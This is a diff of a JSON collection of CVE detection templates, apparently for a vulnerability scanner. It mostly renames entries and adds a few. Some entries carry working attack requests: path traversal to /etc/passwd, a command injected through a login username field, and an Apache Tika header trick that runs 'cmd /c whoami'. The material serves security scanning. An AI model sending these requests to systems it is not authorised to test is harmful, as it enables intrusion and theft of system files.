@@ -5383,7 +5383,7 @@
     {
       "id": "CVE-2017-17562",
       "info": {
-        "name": "Embedthis GoAhead RCE",
+        "name": "Embedthis GoAhead <3.6.5 - Remote Code Execution",
         "severity": "high"
       },
       "requests": [
@@ -5441,7 +5441,7 @@
     {
       "id": "CVE-2017-18638",
       "info": {
-        "name": "Graphite 'graphite.composer.views.send_email' SSRF",
+        "name": "Graphite <=1.1.5 - Server-Side Request Forgery",
         "severity": "high"
       },
       "requests": [
@@ -5534,7 +5534,7 @@
     {
       "id": "CVE-2017-5521",
       "info": {
-        "name": "Bypassing Authentication on NETGEAR Routers",
+        "name": "NETGEAR Routers - Authentication Bypass",
         "severity": "high"
       },
       "requests": [
@@ -5578,7 +5578,7 @@
     {
       "id": "CVE-2017-5982",
       "info": {
-        "name": "Kodi 17.1 Local File Inclusion",
+        "name": "Kodi 17.1 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -5638,7 +5638,7 @@
     {
       "id": "CVE-2017-7615",
       "info": {
-        "name": "MantisBT <=2.30 - Arbitrary Password Reset and Unauthenticated Admin Access",
+        "name": "MantisBT <=2.30 - Arbitrary Password Reset/Admin Access",
         "severity": "high"
       },
       "requests": [
@@ -5833,7 +5833,7 @@
     {
       "id": "CVE-2018-0296",
       "info": {
-        "name": "Cisco ASA path traversal vulnerability",
+        "name": "Cisco ASA - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -5867,7 +5867,7 @@
     {
       "id": "CVE-2018-1000130",
       "info": {
-        "name": "Jolokia Agent Proxy JNDI Code Injection",
+        "name": "Jolokia Agent - JNDI Code Injection",
         "severity": "high"
       },
       "requests": [
@@ -5910,7 +5910,7 @@
     {
       "id": "CVE-2018-1000600",
       "info": {
-        "name": "Pre-auth Fully-responded SSRF",
+        "name": "Jenkins GitHub Plugin <=1.29.1 - Server-Side Request Forgery",
         "severity": "high"
       },
       "requests": [
@@ -5940,7 +5940,7 @@
     {
       "id": "CVE-2018-10093",
       "info": {
-        "name": "AudioCode 400HD - RCE",
+        "name": "AudioCode 420HD - Remote Code Execution",
         "severity": "high"
       },
       "requests": [
@@ -6048,7 +6048,7 @@
     {
       "id": "CVE-2018-10822",
       "info": {
-        "name": "D-Link Routers - Directory Traversal",
+        "name": "D-Link Routers - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -6063,7 +6063,7 @@
     {
       "id": "CVE-2018-10823",
       "info": {
-        "name": "D-Link Routers - Command Injection",
+        "name": "D-Link Routers - Remote Command Injection",
         "severity": "high"
       },
       "requests": [
@@ -6078,7 +6078,7 @@
     {
       "id": "CVE-2018-10956",
       "info": {
-        "name": "IPConfigure Orchid Core VMS 2.0.5 - Unauthenticated Directory Traversal.",
+        "name": "IPConfigure Orchid Core VMS 2.0.5 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -6093,7 +6093,7 @@
     {
       "id": "CVE-2018-11231",
       "info": {
-        "name": "Opencart Divido plugin - Sql Injection",
+        "name": "Opencart Divido - Sql Injection",
         "severity": "high"
       },
       "requests": [
@@ -6138,7 +6138,7 @@
     {
       "id": "CVE-2018-11759",
       "info": {
-        "name": "Apache Tomcat JK Status Manager Access",
+        "name": "Apache Tomcat JK Connect <=1.2.44 - Manager Access",
         "severity": "high"
       },
       "requests": [
@@ -6154,7 +6154,7 @@
     {
       "id": "CVE-2018-11776",
       "info": {
-        "name": "Apache Struts2 S2-057 RCE",
+        "name": "Apache Struts2 S2-057 - Remote Code Execution",
         "severity": "high"
       },
       "requests": [
@@ -6371,11 +6371,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
+            "X-Tika-OCRTesseractPath": "cscript",
+            "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
             "Content-type": "image/jp2",
-            "Connection": "close",
-            "X-Tika-OCRTesseractPath": "cscript",
-            "X-Tika-OCRLanguage": "//E:Jscript"
+            "Connection": "close"
           },
           "method": "PUT",
           "path": [
@@ -6538,6 +6538,21 @@
       ]
     },
     {
+      "id": "CVE-2018-14918",
+      "info": {
+        "name": "LOYTEC LGATE-902 6.3.2 - Directory Traversal",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/webui/file_guest?path=/var/www/documentation/../../../../../etc/passwd&flags=1152"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2018-14931",
       "info": {
         "name": "Polarisft Intellect Core Banking Software Version 9.7.1 - Open Redirect",
@@ -6617,7 +6632,7 @@
     {
       "id": "CVE-2018-15745",
       "info": {
-        "name": "Argus Surveillance DVR - Directory Traversal",
+        "name": "Argus Surveillance DVR 4.0.0.0 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -6721,7 +6736,7 @@
     {
       "id": "CVE-2018-16299",
       "info": {
-        "name": "WordPress Plugin Localize My Post 1.0 - LFI",
+        "name": "WordPress Localize My Post 1.0 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -6736,7 +6751,7 @@
     {
       "id": "CVE-2018-16341",
       "info": {
-        "name": "Nuxeo Authentication Bypass Remote Code Execution",
+        "name": "Nuxeo <10.3 - Remote Code Execution",
         "severity": "high"
       },
       "requests": [
@@ -6932,7 +6947,7 @@
     {
       "id": "CVE-2018-18264",
       "info": {
-        "name": "Kubernetes Dashboard unauthenticated secret access",
+        "name": "Kubernetes Dashboard <1.10.1 - Authentication Bypass",
         "severity": "high"
       },
       "requests": [
@@ -6948,7 +6963,7 @@
     {
       "id": "CVE-2018-18323",
       "info": {
-        "name": "Centos Web Panel 0.9.8.480 LFI",
+        "name": "Centos Web Panel 0.9.8.480 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -7052,7 +7067,7 @@
     {
       "id": "CVE-2018-19326",
       "info": {
-        "name": "Zyxel VMG1312-B10D 5.13AAXA.8 - Directory Traversal",
+        "name": "Zyxel VMG1312-B10D 5.13AAXA.8 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -7127,7 +7142,7 @@
     {
       "id": "CVE-2018-19753",
       "info": {
-        "name": "Tarantella Enterprise Directory Traversal",
+        "name": "Tarantella Enterprise <3.11 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -7157,7 +7172,7 @@
     {
       "id": "CVE-2018-20470",
       "info": {
-        "name": "Sahi pro 7.x/8.x - Directory Traversal",
+        "name": "Tyto Sahi pro 7.x/8.x - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -7485,7 +7500,7 @@
     {
       "id": "CVE-2018-7422",
       "info": {
-        "name": "WordPress Site Editor Plugin LFI",
+        "name": "WordPress Site Editor <=1.1.1 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -7501,7 +7516,7 @@
     {
       "id": "CVE-2018-7467",
       "info": {
-        "name": "AxxonSoft Axxon Next Directory Traversal",
+        "name": "AxxonSoft Axxon Next - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -7577,7 +7592,7 @@
     {
       "id": "CVE-2018-7700",
       "info": {
-        "name": "DedeCMS V5.7SP2 RCE",
+        "name": "DedeCMS 5.7SP2 - Cross-Site Request Forgery/Remote Code Execution",
         "severity": "high"
       },
       "requests": [
@@ -7592,7 +7607,7 @@
     {
       "id": "CVE-2018-7719",
       "info": {
-        "name": "Acrolinx Server Directory Traversal",
+        "name": "Acrolinx Server <5.2.5 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -7621,7 +7636,7 @@
     {
       "id": "CVE-2018-8033",
       "info": {
-        "name": "Apache OFBiz XXE",
+        "name": "Apache OFBiz 16.11.04 - XML Entity Injection",
         "severity": "high"
       },
       "requests": [
@@ -7664,7 +7679,7 @@
     {
       "id": "CVE-2018-8727",
       "info": {
-        "name": "Mirasys DVMS Workstation 5.12.6 Path Traversal",
+        "name": "Mirasys DVMS Workstation <=5.12.6 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -7694,7 +7709,7 @@
     {
       "id": "CVE-2018-9118",
       "info": {
-        "name": "WP Background Takeover, Directory Traversal <= 4.1.4",
+        "name": "WordPress 99 Robots WP Background Takeover Advertisements <=4.1.4 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -7769,7 +7784,7 @@
     {
       "id": "CVE-2019-0193",
       "info": {
-        "name": "Apache Solr - DataImportHandler RCE",
+        "name": "Apache Solr DataImportHandler <8.2.0 - Remote Code Execution",
         "severity": "high"
       },
       "requests": [
@@ -7953,7 +7968,7 @@
     {
       "id": "CVE-2019-11248",
       "info": {
-        "name": "exposed_pprof",
+        "name": "Debug Endpoint pprof - Exposure Detection",
         "severity": "high"
       },
       "requests": [
@@ -8029,7 +8044,7 @@
     {
       "id": "CVE-2019-12276",
       "info": {
-        "name": "GrandNode 4.40 - Path Traversal",
+        "name": "GrandNode 4.40 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -8099,7 +8114,6 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}",
             "{{BaseURL}}/free_time.cgi"
           ]
         }
@@ -8108,7 +8122,7 @@
     {
       "id": "CVE-2019-12593",
       "info": {
-        "name": "IceWarp <=10.4.4 - Local File Inclusion",
+        "name": "IceWarp Mail Server <=10.4.4 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -8230,7 +8244,7 @@
     {
       "id": "CVE-2019-14205",
       "info": {
-        "name": "WordPress Ext Adaptive Images LFI",
+        "name": "WordPress Nevma Adaptive Images <0.6.67 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -8279,7 +8293,7 @@
     {
       "id": "CVE-2019-14322",
       "info": {
-        "name": "Odoo 12.0 - Local File Inclusion",
+        "name": "Pallets Werkzeug <0.15.5 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -8385,7 +8399,7 @@
     {
       "id": "CVE-2019-15858",
       "info": {
-        "name": "Unauthenticated Woody Ad Snippets WordPress Plugin RCE",
+        "name": "WordPress Woody Ad Snippets <2.2.5 - Cross-Site Scripting/Remote Code Execution",
         "severity": "high"
       },
       "requests": [
@@ -8449,7 +8463,7 @@
     {
       "id": "CVE-2019-16123",
       "info": {
-        "name": "PilusCart <= 1.4.1 - Arbitrary File Retrieval",
+        "name": "PilusCart <=1.4.1 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -8523,7 +8537,7 @@
     {
       "id": "CVE-2019-1653",
       "info": {
-        "name": "Unauthenticated Cisco Small Business WAN VPN Routers Sensitive Info Disclosure",
+        "name": "Cisco Small Business WAN VPN Routers - Sensitive Information Disclosure",
         "severity": "high"
       },
       "requests": [
@@ -8616,7 +8630,7 @@
     {
       "id": "CVE-2019-16996",
       "info": {
-        "name": "Metinfo7.0 beta - SQL Injection",
+        "name": "Metinfo 7.0.0 beta - SQL Injection",
         "severity": "high"
       },
       "requests": [
@@ -8631,7 +8645,7 @@
     {
       "id": "CVE-2019-16997",
       "info": {
-        "name": "Metinfo 7.0.0 beta SQLI",
+        "name": "Metinfo 7.0.0 beta - SQL Injection",
         "severity": "high"
       },
       "requests": [
@@ -8674,7 +8688,7 @@
     {
       "id": "CVE-2019-17418",
       "info": {
-        "name": "MetInfo 7.0 - SQL Injection",
+        "name": "MetInfo 7.0.0 beta - SQL Injection",
         "severity": "high"
       },
       "requests": [
@@ -8738,7 +8752,7 @@
     {
       "id": "CVE-2019-17538",
       "info": {
-        "name": "Jnoj arbitrary local file inclusion (LFI)",
+        "name": "Jiangnan Online Judge 0.8.0 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -8783,7 +8797,7 @@
     {
       "id": "CVE-2019-18371",
       "info": {
-        "name": "Xiaomi routers - Local file inclusion",
+        "name": "Xiaomi Mi WiFi R3G Routers - Local file Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -8826,6 +8840,21 @@
       ]
     },
     {
+      "id": "CVE-2019-18665",
+      "info": {
+        "name": "DOMOS 5.5 - Directory Traversal",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/page/sl_logdl?dcfct=DCMlog.download_log&dbkey%3Asyslog.rlog=/etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2019-18818",
       "info": {
         "name": "strapi CMS <3.0.0-beta.17.5 - Admin Password Reset",
@@ -8842,7 +8871,7 @@
     {
       "id": "CVE-2019-18922",
       "info": {
-        "name": "Allied Telesis AT-GS950/8 Directory Traversal",
+        "name": "Allied Telesis AT-GS950/8 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -8902,7 +8931,7 @@
     {
       "id": "CVE-2019-19824",
       "info": {
-        "name": "TOTOLINK  - Remote Code Execution",
+        "name": "TOTOLINK Realtek SD Routers - Remote Command Injection",
         "severity": "high"
       },
       "requests": [
@@ -8946,7 +8975,7 @@
     {
       "id": "CVE-2019-20085",
       "info": {
-        "name": "TVT NVMS 1000 - Directory Traversal",
+        "name": "TVT NVMS 1000 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -8977,7 +9006,7 @@
     {
       "id": "CVE-2019-20183",
       "info": {
-        "name": "Simple Employee Records System 1.0 arbitrary file upload",
+        "name": "Simple Employee Records System 1.0 - Unrestricted File Upload",
         "severity": "high"
       },
       "requests": [
@@ -9007,7 +9036,7 @@
     {
       "id": "CVE-2019-20224",
       "info": {
-        "name": "Pandorafms - Remote Code Execution",
+        "name": "Pandora FMS 7.0NG - Remote Command Injection",
         "severity": "high"
       },
       "requests": [
@@ -10817,8 +10846,8 @@
         {
           "body": "op=login&username=;`cat /etc/passwd`&password=\n",
           "headers": {
-            "Referer": "{{Hostname}}/module/login/login.html",
-            "Content-Type": "application/x-www-form-urlencoded"
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Referer": "{{Hostname}}/module/login/login.html"
           },
           "method": "POST",
           "path": [
